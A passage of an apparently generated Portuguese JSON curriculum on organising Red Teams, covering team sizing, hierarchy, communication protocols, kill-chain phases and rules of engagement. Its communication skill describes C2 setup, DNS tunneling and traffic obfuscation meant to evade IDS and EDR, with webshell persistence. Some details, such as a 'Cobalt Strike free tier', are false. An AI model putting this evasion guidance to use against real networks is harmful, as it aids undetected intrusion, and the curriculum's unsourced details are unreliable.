                                "Matriz de papéis alocados cobrindo 100% das fases sem gaps.",
                                "Simulação mock confirma viabilidade em 80%+ de cenários.",
                                "Feedback de stakeholder aprova tamanho e orçamento.",
                                "Plano inclui buffer e contingências documentadas.",
                                "Referências a Simpson et al. integradas corretamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão do cálculo: ±10% de tamanhos benchmarked (90%+ acurácia).",
                                "Cobertura de fatores: Todos os 5+ fatores identificados e ponderados.",
                                "Referenciação: Uso correto de Simpson et al. com citação exata.",
                                "Documentação: Clareza e completude em todos os templates.",
                                "Viabilidade: Plano realista com buffer e validação externa.",
                                "Criatividade: Ajustes personalizados além de fórmulas genéricas."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos: Técnicas de WBS e resource allocation (PMBOK).",
                                "Liderança e RH: Assessment de skills e team building.",
                                "Matemática Aplicada: Modelos quantitativos e ponderação de variáveis.",
                                "Ética e Direito: Compliance em ethical hacking e operações Red Team.",
                                "Estatística: Análise de benchmarks históricos de simulações."
                              ],
                              "realWorldApplication": "Em operações Red Team de empresas como Google ou bancos, dimensionar corretamente evita falhas em jogos de guerra cibernéticos, otimizando custos (ex.: equipe de 12 reduziu tempo de simulação em 30% em caso DEF CON) e maximizando detecção de vulnerabilidades reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.2",
                        "name": "Hierarquia e Estrutura de Comando",
                        "description": "Estrutura hierárquica interna do Red Team, incluindo cadeia de comando e responsabilidades para coordenação durante operações ofensivas simuladas.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.2.1",
                            "name": "Desenhar organograma hierárquico",
                            "description": "Criar diagramas de hierarquia com Team Lead no topo, operators em níveis operacionais e suporte em base, inspirado em conceitos de comando e controle cibernético.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos de hierarquia em Red Teams",
                                  "subSteps": [
                                    "Pesquisar estruturas organizacionais típicas de Red Teams em segurança cibernética",
                                    "Identificar níveis hierárquicos: Team Lead no topo, operators operacionais e suporte na base",
                                    "Estudar inspirações em comando e controle cibernético (ex.: modelos militares adaptados)",
                                    "Mapear fluxos de comunicação e decisão entre níveis",
                                    "Anotar responsabilidades principais de cada nível"
                                  ],
                                  "verification": "Lista de conceitos chave anotados e entendidos, com referências a fontes confiáveis",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet para pesquisa",
                                    "Documentos sobre Red Teams (ex.: MITRE ATT&CK)",
                                    "Bloco de notas ou editor de texto"
                                  ],
                                  "tips": "Use diagramas de referência existentes como base para evitar reinventar a roda",
                                  "learningObjective": "Entender a lógica hierárquica inspirada em cibernética para organizar equipes de ataque simulado",
                                  "commonMistakes": [
                                    "Ignorar fluxos de comunicação descendente e ascendente",
                                    "Confundir hierarquia com estrutura plana",
                                    "Não considerar escalabilidade para equipes maiores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir papéis, níveis e relações hierárquicas",
                                  "subSteps": [
                                    "Listar papéis: Team Lead (estratégia), Operators (execução), Suporte (logística/técnica)",
                                    "Definir subníveis operacionais (ex.: Senior Operator, Junior Operator)",
                                    "Estabelecer linhas de reporte: direto do suporte para operators, operators para Team Lead",
                                    "Identificar conexões cruzadas (ex.: suporte direto a operators para ferramentas)",
                                    "Criar tabela de responsabilidades e interdependências"
                                  ],
                                  "verification": "Tabela completa de papéis e relações, revisada por auto-perguntas sobre clareza",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha (Google Sheets ou Excel)",
                                    "Referências de estruturas de Red Team"
                                  ],
                                  "tips": "Priorize papéis baseados em cenários reais de jogos de guerra cibernética",
                                  "learningObjective": "Mapear precisamente a estrutura organizacional para refletir comando e controle eficaz",
                                  "commonMistakes": [
                                    "Sobrecarregar o Team Lead com tarefas operacionais",
                                    "Omitir suporte como base essencial",
                                    "Criar relações ambíguas de reporte"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Esboçar e construir o organograma",
                                  "subSteps": [
                                    "Escolher ferramenta de diagramação (ex.: Draw.io, Lucidchart ou papel/caneta)",
                                    "Posicionar Team Lead no topo como caixa raiz",
                                    "Adicionar níveis inferiores: operators no meio, suporte na base, com setas de hierarquia",
                                    "Incluir rótulos claros para papéis e linhas de conexão",
                                    "Adicionar legendas para fluxos de comando e controle"
                                  ],
                                  "verification": "Diagrama esboçado com todos os elementos visíveis e legíveis",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação gratuita (Draw.io)",
                                    "Papel e caneta para rascunho inicial"
                                  ],
                                  "tips": "Use cores para diferenciar níveis (ex.: azul para liderança, verde para operações)",
                                  "learningObjective": "Criar visualização clara e hierárquica do organograma",
                                  "commonMistakes": [
                                    "Colocar elementos desalinhados ou bagunçados",
                                    "Usar setas bidirecionais onde só descendente aplica",
                                    "Ignorar espaçamento para legibilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Refinar, validar e documentar o organograma",
                                  "subSteps": [
                                    "Revisar alinhamento com conceitos cibernéticos de comando e controle",
                                    "Testar escalabilidade adicionando mais membros fictícios",
                                    "Adicionar notas explicativas sobre fluxos de decisão",
                                    "Exportar em formato compartilhável (PNG/PDF)",
                                    "Simular um cenário de jogo de guerra para validar estrutura"
                                  ],
                                  "verification": "Organograma final testado em simulação simples e documentado",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação",
                                    "Cenário fictício de Red Team"
                                  ],
                                  "tips": "Peça feedback de um par ou use auto-revisão com checklist",
                                  "learningObjective": "Garantir que o organograma seja prático e alinhado ao contexto de Red Team",
                                  "commonMistakes": [
                                    "Não validar com cenários reais",
                                    "Esquecer documentação de fluxos",
                                    "Tornar o diagrama muito complexo visualmente"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um organograma para um Red Team de 12 membros: Team Lead (1), Senior Operators (3), Junior Operators (5), Suporte Técnico (3). Team Lead supervisiona todos; Operators reportam diretamente ao Lead com suporte acessível via linhas pontilhadas, simulando um ataque cibernético coordenado.",
                              "finalVerifications": [
                                "Team Lead posicionado no topo com autoridade clara",
                                "Níveis operacionais e de suporte hierarquizados corretamente",
                                "Linhas de reporte e comunicação visíveis e lógicas",
                                "Alinhamento com princípios de comando cibernético",
                                "Diagrama legível e escalável",
                                "Inclui pelo menos 3 fluxos de exemplo (ex.: ordem de ataque)"
                              ],
                              "assessmentCriteria": [
                                "Clareza visual e hierarquia intuitiva (nota 1-10)",
                                "Precisão na representação de papéis e relações (completa?)",
                                "Integração de conceitos cibernéticos (evidências?)",
                                "Legibilidade e profissionalismo do diagrama",
                                "Validação prática via simulação",
                                "Documentação de fluxos e responsabilidades"
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Estruturas de equipe em PMBOK",
                                "Design Gráfico: Princípios de visualização de dados (Tufte)",
                                "Liderança e Organização: Teoria de comando militar",
                                "Segurança da Informação: Frameworks MITRE para Red Teams"
                              ],
                              "realWorldApplication": "Em operações reais de Red Team, esse organograma guia a coordenação de ataques simulados, garantindo comando centralizado pelo Team Lead, execução eficiente por operators e suporte contínuo, otimizando respostas em jogos de guerra cibernética contra defesas azuis."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.2",
                            "name": "Definir responsabilidades por nível",
                            "description": "Especificar duties como planejamento estratégico para leads e execução tática para operators, alinhando com regras de engajamento em simulações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar a Hierarquia e Estrutura do Red Team",
                                  "subSteps": [
                                    "Identifique os níveis hierárquicos principais: leads (estratégicos), operators (táticos) e suporte.",
                                    "Mapeie fluxos de comunicação e autoridade entre níveis.",
                                    "Revise organogramas existentes ou crie um esboço inicial.",
                                    "Consulte documentação de regras de engajamento (ROE) para alinhamento.",
                                    "Documente gaps atuais em responsabilidades definidas."
                                  ],
                                  "verification": "Organograma atualizado com níveis e fluxos claros, aprovado por equipe.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Organograma template",
                                    "Documentos ROE",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use cores para diferenciar níveis estratégicos (azul) e táticos (vermelho).",
                                  "learningObjective": "Compreender a estrutura organizacional para alocação precisa de responsabilidades.",
                                  "commonMistakes": "Ignorar fluxos de comunicação ascendentes, levando a silos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Responsabilidades Específicas por Nível",
                                  "subSteps": [
                                    "Para leads: Liste duties como planejamento estratégico, definição de objetivos de missão e alocação de recursos.",
                                    "Para operators: Detalhe execução tática, como reconnaissance, exploitation e reporting em tempo real.",
                                    "Inclua suporte: Monitoramento, logística e análise pós-simulação.",
                                    "Garanta não sobreposição: Cada duty exclusiva por nível.",
                                    "Priorize duties baseadas em cenários de simulação cibernética."
                                  ],
                                  "verification": "Matriz de responsabilidades (RACI) preenchida para cada nível.",
                                  "estimatedTime": "2-3 hours",
                                  "materials": [
                                    "Matriz RACI template",
                                    "Casos de estudo de Red Teams",
                                    "Ferramenta como Excel ou Notion"
                                  ],
                                  "tips": "Use verbos de ação (planejar, executar, monitorar) para clareza.",
                                  "learningObjective": "Especificar duties alinhadas ao nível de seniority e expertise.",
                                  "commonMistakes": "Sobrecarregar operators com decisões estratégicas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Alinhar Responsabilidades com Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Revise ROE para limites éticos, legais e operacionais em simulações.",
                                    "Integre ROE em cada duty: ex., leads aprovam escaladas, operators param em violações.",
                                    "Crie checklists de conformidade por nível.",
                                    "Simule cenários hipotéticos para testar alinhamento.",
                                    "Ajuste duties para mitigar riscos de desvio."
                                  ],
                                  "verification": "Checklists de ROE integrados à matriz de responsabilidades.",
                                  "estimatedTime": "1.5-2.5 hours",
                                  "materials": [
                                    "Documento ROE oficial",
                                    "Cenários de simulação",
                                    "Checklist template"
                                  ],
                                  "tips": "Marque duties 'ROE-críticos' em negrito para destaque.",
                                  "learningObjective": "Garantir que todas duties respeitem limites operacionais e legais.",
                                  "commonMistakes": "Definir duties amplas que ignorem nuances das ROE."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar, Comunicar e Validar a Estrutura",
                                  "subSteps": [
                                    "Compile tudo em um documento único: hierarquia, matriz RACI e ROE.",
                                    "Compartilhe draft com equipe para feedback.",
                                    "Realize workshop de validação com role-playing de simulação.",
                                    "Incorpore feedback e finalize versão.",
                                    "Planeje revisões periódicas baseadas em lições aprendidas."
                                  ],
                                  "verification": "Documento aprovado por todos os níveis, com atas de workshop.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Ferramenta colaborativa como Google Docs",
                                    "Agenda de workshop",
                                    "Templates de feedback"
                                  ],
                                  "tips": "Use versionamento (v1.0) para rastrear mudanças.",
                                  "learningObjective": "Criar uma estrutura acionável e sustentável para o Red Team.",
                                  "commonMistakes": "Não envolver a equipe, causando baixa adesão."
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque a uma rede corporativa, o lead define o objetivo estratégico (infiltração sem detecção em 48h) e aloca operators para execução tática (scan de portas com Nmap), parando se ROE for violada (ex.: evitar dados sensíveis de RH).",
                              "finalVerifications": [
                                "Matriz RACI cobre todos os níveis sem sobreposições.",
                                "Cada duty alinha explicitamente com pelo menos uma ROE.",
                                "Equipe demonstra compreensão via quiz ou role-play.",
                                "Documento é acessível e versionado.",
                                "Gaps identificados foram endereçados.",
                                "Estrutura escalável para equipes maiores."
                              ],
                              "assessmentCriteria": [
                                "Clareza e especificidade das duties (90% acionáveis).",
                                "Alinhamento total com ROE (zero violações potenciais).",
                                "Cobertura completa de hierarquia sem lacunas.",
                                "Feedback da equipe positivo (>80% aprovação).",
                                "Capacidade de aplicação em simulação real.",
                                "Documentação profissional e concisa."
                              ],
                              "crossCurricularConnections": [
                                "Liderança e Gerenciamento de Projetos (alocação de roles).",
                                "Ética e Compliance (integração de ROE).",
                                "Comunicação Organizacional (fluxos claros).",
                                "Simulações e Treinamento (role-playing)."
                              ],
                              "realWorldApplication": "Em equipes de pentest profissionais ou Red Teams governamentais, essa estrutura previne erros operacionais, assegura conformidade legal durante exercícios cibernéticos reais e otimiza eficiência em incidentes de resposta a ameaças."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.3",
                            "name": "Implementar comunicação hierárquica",
                            "description": "Estabelecer protocolos de comunicação (ex.: canais criptografados) para manter a hierarquia durante pivoting e persistência em testes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir a estrutura hierárquica e mapear requisitos de comunicação",
                                  "subSteps": [
                                    "Identificar papéis na hierarquia (líder, operadores de pivoting, persistência).",
                                    "Mapear fluxos de comunicação necessários (comandos descendentes, relatórios ascendentes).",
                                    "Analisar riscos de detecção e requisitos de sigilo (criptografia, ofuscação).",
                                    "Documentar protocolos iniciais (canais primários/secundários, frequência de check-ins).",
                                    "Definir regras de escalonamento para falhas de comunicação."
                                  ],
                                  "verification": "Documento de planejamento aprovado com fluxos mapeados e riscos avaliados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de diagramação (Draw.io ou Lucidchart)",
                                    "Templates de planejamento Red Team"
                                  ],
                                  "tips": "Priorize simplicidade para evitar sobrecarga em cenários de alta pressão.",
                                  "learningObjective": "Compreender como alinhar comunicação à hierarquia para eficiência operacional.",
                                  "commonMistakes": [
                                    "Ignorar falhas potenciais de rede.",
                                    "Definir canais muito complexos para iniciantes.",
                                    "Não considerar latência em pivoting."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar e configurar protocolos de comunicação seguros",
                                  "subSteps": [
                                    "Escolher frameworks C2 (ex: Covenant, Sliver, Empire) com suporte a criptografia.",
                                    "Configurar canais criptografados (TLS, Noise Protocol) e autenticação mútua.",
                                    "Implementar ofuscação de tráfego (HTTP/S, DNS tunneling).",
                                    "Estabelecer chaves assimétricas e rotação de sessões.",
                                    "Testar configuração em ambiente isolado para vazamentos."
                                  ],
                                  "verification": "Teste de configuração mostra tráfego criptografado sem detecção por Wireshark básico.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Frameworks C2 (Covenant/Sliver)",
                                    "Ambiente VM (Kali Linux, targets Windows/Linux)",
                                    "Wireshark"
                                  ],
                                  "tips": "Use certificados auto-assinados inicialmente para agilidade, migre para CA em produção.",
                                  "learningObjective": "Dominar configuração de protocolos que preservam hierarquia e sigilo.",
                                  "commonMistakes": [
                                    "Usar criptografia fraca (ex: sem PFS).",
                                    "Expor metadados desnecessários.",
                                    "Não rotacionar chaves periodicamente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e testar comunicação hierárquica em simulação",
                                  "subSteps": [
                                    "Desenvolver operadores simulados na hierarquia e conectar via C2.",
                                    "Executar comandos hierárquicos (líder envia para pivoting, relatórios sobem).",
                                    "Simular pivoting (ex: de host A para B) e verificar persistência da comunicação.",
                                    "Testar resiliência (desconexões, reconexões automáticas).",
                                    "Registrar logs de comunicação para análise."
                                  ],
                                  "verification": "Comunicação bidirecional funciona em 100% dos testes de pivoting e persistência.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Lab de simulação (VirtualBox/VMware com múltiplos hosts)",
                                    "Scripts de pivoting (Metasploit ou Cobalt Strike free tier)"
                                  ],
                                  "tips": "Grave sessões com tcpdump para replay e depuração.",
                                  "learningObjective": "Aplicar comunicação em cenários dinâmicos de Red Team.",
                                  "commonMistakes": [
                                    "Não simular falhas reais de rede.",
                                    "Perder hierarquia em reconexões.",
                                    "Ignorar overhead de criptografia em redes lentas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar, otimizar e documentar para operações persistentes",
                                  "subSteps": [
                                    "Configurar monitoramento de canais (alertas de falha, métricas de latência).",
                                    "Otimizar para pivoting contínuo (fallback channels, dead drops).",
                                    "Realizar debrief com análise de logs e lições aprendidas.",
                                    "Documentar playbook completo para replicação em equipes.",
                                    "Planejar auditoria de segurança dos canais."
                                  ],
                                  "verification": "Playbook documentado e monitoramento ativo com alertas funcionais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de monitoramento (Prometheus/Grafana lite)",
                                    "Templates de playbook Red Team"
                                  ],
                                  "tips": "Automatize alertas via scripts para reduzir carga manual.",
                                  "learningObjective": "Garantir sustentabilidade da comunicação hierárquica em operações longas.",
                                  "commonMistakes": [
                                    "Falta de fallback para canais primários.",
                                    "Documentação incompleta.",
                                    "Não auditar periodicamente."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulando APT, o líder usa Sliver C2 para enviar comandos criptografados a operadores: pivoting de um servidor web para banco de dados via SSH tunnel, mantendo relatórios hierárquicos de persistência com webshells, sem detecção por EDR básico.",
                              "finalVerifications": [
                                "Comunicação hierárquica resiste a simulações de pivoting e persistência.",
                                "Tráfego é indetectável por ferramentas padrão (Snort, Suricata).",
                                "Hierarquia é preservada em falhas de 50% dos canais.",
                                "Tempo de resposta de comandos < 5s em pivoting.",
                                "Logs mostram zero vazamentos de comandos sensíveis.",
                                "Equipe simula operação completa sem perda de comando."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de criptografia (100% end-to-end).",
                                "Resiliência testada em pelo menos 3 cenários de falha.",
                                "Documentação clara e acionável do playbook.",
                                "Integração perfeita com pivoting/persistência.",
                                "Eficiência: latência média < 3s, zero erros de autenticação.",
                                "Criatividade em ofuscação sem comprometer usabilidade."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia Avançada (SC-03: Protocolos Seguros).",
                                "Redes e Infraestrutura (SC-04: Tunneling e Ofuscação).",
                                "Liderança e Gerenciamento de Equipes (Soft Skills: Comando).",
                                "Análise de Malware (SC-07: Persistência).",
                                "Inteligência de Ameaças (SC-01: TTPs de APTs)"
                              ],
                              "realWorldApplication": "Em operações de Red Team corporativas ou governamentais, como simulações de APTs (ex: Fancy Bear), equipes usam C2 hierárquicos criptografados para coordenar pivoting em redes enterprise, mantendo comando centralizado durante meses de persistência, evitando detecção por SIEMs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.3",
                        "name": "Organização e Processos Operacionais",
                        "description": "Processos e fluxos de trabalho para montagem e operação da equipe Red Team em jogos de guerra cibernética, incluindo planejamento e debriefing.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.3.1",
                            "name": "Estruturar fases operacionais",
                            "description": "Dividir operações em fases como reconnaissance, weaponization, delivery e control, adaptando para ambientes de montagem de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as Fases Padrão do Cyber Kill Chain",
                                  "subSteps": [
                                    "Estude o modelo Cyber Kill Chain da Lockheed Martin.",
                                    "Identifique as 7 fases principais: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives.",
                                    "Anote definições e objetivos de cada fase.",
                                    "Compare com frameworks alternativos como MITRE ATT&CK.",
                                    "Registre exemplos reais de cada fase."
                                  ],
                                  "verification": "Lista completa das 7 fases com definições curtas documentada.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação oficial do Cyber Kill Chain (PDF/site Lockheed Martin), caderno ou ferramenta de notas (Notion/OneNote).",
                                  "tips": "Use diagramas visuais para memorizar a sequência linear das fases.",
                                  "learningObjective": "Dominar as fases fundamentais do ciclo de ataque cibernético.",
                                  "commonMistakes": "Confundir Cyber Kill Chain com etapas de defesa ou ignorar a linearidade do modelo."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adaptar Fases para Jogos de Guerra Cibernéticos",
                                  "subSteps": [
                                    "Analise o ambiente simulado: redes virtuais, VMs, ferramentas de CTF.",
                                    "Mapeie cada fase do CKC para ações simuladas (ex: recon com Nmap em lab).",
                                    "Defina limitações éticas e legais para simulações.",
                                    "Crie variações para Blue/Red Team (ex: delivery via payloads inofensivos).",
                                    "Documente adaptações em tabela comparativa."
                                  ],
                                  "verification": "Tabela de adaptação com pelo menos 7 linhas (uma por fase) criada.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas de virtualização (VirtualBox/VMware), documentação de labs cibernéticos (TryHackMe/HackTheBox).",
                                  "tips": "Priorize simulações seguras usando ambientes isolados para evitar vazamentos.",
                                  "learningObjective": "Personalizar o CKC para cenários controlados de treinamento.",
                                  "commonMistakes": "Não considerar restrições de simulação, como ausência de impacto real."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar Atividades, Ferramentas e Métricas por Fase",
                                  "subSteps": [
                                    "Para cada fase, liste 3-5 atividades específicas adaptadas.",
                                    "Selecione ferramentas (ex: recon - Shodan/Maltego; weaponization - Metasploit).",
                                    "Defina métricas de sucesso (ex: % de hosts mapeados na recon).",
                                    "Estime duração e recursos humanos por fase.",
                                    "Crie checklist de entregas por fase."
                                  ],
                                  "verification": "Planilha ou documento com atividades, ferramentas e métricas para todas as fases.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Planilha Google Sheets/Excel, lista de ferramentas OSS (Nmap, Burp Suite).",
                                  "tips": "Use templates prontos de Red Team para agilizar o preenchimento.",
                                  "learningObjective": "Tornar a estrutura operacional acionável e mensurável.",
                                  "commonMistakes": "Sobrecarregar fases iniciais sem equilibrar com fases finais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Documentar a Estrutura Operacional",
                                  "subSteps": [
                                    "Crie fluxograma visual das fases adaptadas.",
                                    "Simule uma operação completa em ambiente de teste.",
                                    "Colete feedback de pares ou mentor.",
                                    "Ajuste baseando em lições aprendidas.",
                                    "Finalize documento com regras de engajamento (ROE)."
                                  ],
                                  "verification": "Fluxograma e documento final revisados e aprovados por revisor.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io/Lucidchart), ambiente de lab cibernético.",
                                  "tips": "Teste em escala reduzida antes de full simulation.",
                                  "learningObjective": "Garantir viabilidade e usabilidade da estrutura em operações reais.",
                                  "commonMistakes": "Ignorar ROE, levando a simulações não éticas ou ineficazes."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando ataque a uma infraestrutura crítica, a fase de reconnaissance usa Nmap para mapear portas em VMs isoladas; weaponization cria payload com msfvenom inofensivo; delivery via phishing simulado em interface web; control estabelece beacon no atacante controlado.",
                              "finalVerifications": [
                                "Todas as 7 fases do CKC adaptadas com atividades claras.",
                                "Fluxograma visual completo e legível.",
                                "Métricas de sucesso definidas para cada fase.",
                                "Regras de engajamento (ROE) incluídas.",
                                "Simulação teste executada sem erros críticos.",
                                "Documentação pronta para uso em Red Team."
                              ],
                              "assessmentCriteria": [
                                "Completude: Cobertura de todas as fases (30%)",
                                "Clareza e Estrutura: Títulos e substeps acionáveis (25%)",
                                "Adequação ao Contexto: Adaptação perfeita para simulações (20%)",
                                "Mensurabilidade: Métricas e verificações viáveis (15%)",
                                "Inovação: Conexões com ferramentas modernas (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Fases semelhantes ao PMBOK (iniciação, planejamento, execução).",
                                "Design de Jogos: Loops de gameplay adaptados para fases de ataque/defesa.",
                                "Engenharia de Software: Ciclo de vida SDLC para desenvolvimento de payloads.",
                                "Análise de Riscos: Modelos como NIST para avaliação por fase."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, essa estrutura organiza ataques autorizados contra empresas, garantindo rastreabilidade, conformidade legal (ex: sob contratos de pentest) e aprendizado efetivo para defesas cibernéticas em cenários como eleições ou infraestruturas críticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.2",
                            "name": "Gerenciar regras de engajamento",
                            "description": "Definir e aplicar RoE (Rules of Engagement) para limitar ações da equipe, garantindo conformidade legal em simulações ofensivas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos e Importância das RoE",
                                  "subSteps": [
                                    "Estude definições de RoE em contextos militares e cibernéticos.",
                                    "Analise exemplos históricos de violações de RoE em operações cibernéticas.",
                                    "Identifique componentes chave: limites geográficos, técnicos, legais e éticos.",
                                    "Revise frameworks como NIST SP 800-53 para conformidade em segurança.",
                                    "Discuta com pares o impacto de RoE mal definidas."
                                  ],
                                  "verification": "Resuma em um documento de 1 página os componentes chave das RoE e forneça 3 exemplos de violações históricas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "NIST SP 800-53",
                                    "Documentos sobre operações Red Team",
                                    "Casos de estudo como Stuxnet"
                                  ],
                                  "tips": "Use analogias militares para facilitar compreensão, como 'linhas vermelhas' em combates.",
                                  "learningObjective": "Dominar o propósito, componentes e riscos associados às RoE em simulações ofensivas.",
                                  "commonMistakes": [
                                    "Confundir RoE com regras de jogo genéricas",
                                    "Ignorar contextos cibernéticos específicos",
                                    "Subestimar implicações legais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar Contexto Operacional e Requisitos Legais",
                                  "subSteps": [
                                    "Mapeie o escopo da simulação: alvos, objetivos e restrições técnicas.",
                                    "Consulte leis aplicáveis (ex: LGPD no Brasil, GDPR na UE, leis de hacking ético).",
                                    "Identifique stakeholders: clientes, reguladores e equipe interna.",
                                    "Realize análise de riscos para ações ofensivas potenciais.",
                                    "Documente restrições específicas como 'sem ataques DoS' ou 'apenas portas abertas'."
                                  ],
                                  "verification": "Crie um relatório de avaliação de contexto com lista de leis relevantes e riscos identificados.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Leis de cibersegurança nacionais/internacionais",
                                    "Templates de análise de risco",
                                    "Ferramentas como Risk Matrix Excel"
                                  ],
                                  "tips": "Envolva um advogado especializado em cibersegurança desde o início para validação.",
                                  "learningObjective": "Avaliar com precisão o ambiente operacional e requisitos legais para RoE.",
                                  "commonMistakes": [
                                    "Sobrestimar autorizações implícitas",
                                    "Ignorar jurisdições internacionais",
                                    "Não considerar dados sensíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Redigir e Documentar as RoE",
                                  "subSteps": [
                                    "Estruture o documento: introdução, regras específicas, exceções e penalidades.",
                                    "Defina regras claras e mensuráveis, ex: 'Exploração limitada a vulnerabilidades CVE conhecidas'.",
                                    "Inclua cláusulas de escalonamento para ações não previstas.",
                                    "Use linguagem precisa, evitando ambiguidades.",
                                    "Obtenha aprovação formal de stakeholders."
                                  ],
                                  "verification": "Produza um documento RoE completo de 5-10 páginas, revisado e aprovado por um par.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Templates de RoE (MITRE ATT&CK Red Team)",
                                    "Ferramentas de edição como Google Docs ou Markdown"
                                  ],
                                  "tips": "Teste as regras com cenários hipotéticos para detectar ambiguidades.",
                                  "learningObjective": "Criar RoE claras, abrangentes e acionáveis para operações Red Team.",
                                  "commonMistakes": [
                                    "Regras vagas ou interpretáveis",
                                    "Falta de seções de exceções",
                                    "Não incluir métricas de conformidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comunicar, Treinar e Aplicar RoE em Simulação",
                                  "subSteps": [
                                    "Realize sessão de briefing com a equipe, usando quizzes para verificação.",
                                    "Integre RoE em ferramentas de monitoramento (ex: logs de SIEM simulados).",
                                    "Execute simulação controlada e monitore adesão em tempo real.",
                                    "Registre incidentes potenciais de violação.",
                                    "Realize debriefing pós-simulação para lições aprendidas."
                                  ],
                                  "verification": "Equipe completa assina termo de adesão; simulação executada sem violações reportadas.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Plataformas de simulação como Cyber Range ou HackTheBox",
                                    "Ferramentas de logging como ELK Stack",
                                    "Questionários online (Google Forms)"
                                  ],
                                  "tips": "Use role-playing para treinar respostas a dilemas éticos durante a simulação.",
                                  "learningObjective": "Implementar e fiscalizar RoE efetivamente durante operações ofensivas simuladas.",
                                  "commonMistakes": [
                                    "Treinamento superficial sem testes",
                                    "Falta de monitoramento contínuo",
                                    "Ignorar feedback pós-exercício"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação Red Team contra uma rede corporativa fictícia, as RoE especificam: (1) Apenas explorar portas abertas no range 1-1024; (2) Notificar imediatamente se dados PII forem encontrados; (3) Proibido qualquer forma de DoS ou ransomware simulado; (4) Parar operações se defesa ativa for detectada. A equipe adere, explorando uma vulnerabilidade SQLi em um servidor web, mas para ao encontrar dados de clientes, escalonando para aprovação.",
                              "finalVerifications": [
                                "Documento RoE completo e aprovado por stakeholders.",
                                "100% da equipe treinada e assinou adesão.",
                                "Simulação executada sem violações de RoE.",
                                "Relatório de monitoramento com logs de conformidade.",
                                "Debriefing documentado com lições aprendidas.",
                                "Auditoria externa confirma legalidade das ações."
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão das regras (sem ambiguidades).",
                                "Completude: cobre todos riscos legais e operacionais.",
                                "Mensurabilidade: regras verificáveis por logs ou observação.",
                                "Adesão durante simulação: zero violações.",
                                "Eficácia: equilibra ofensividade com conformidade.",
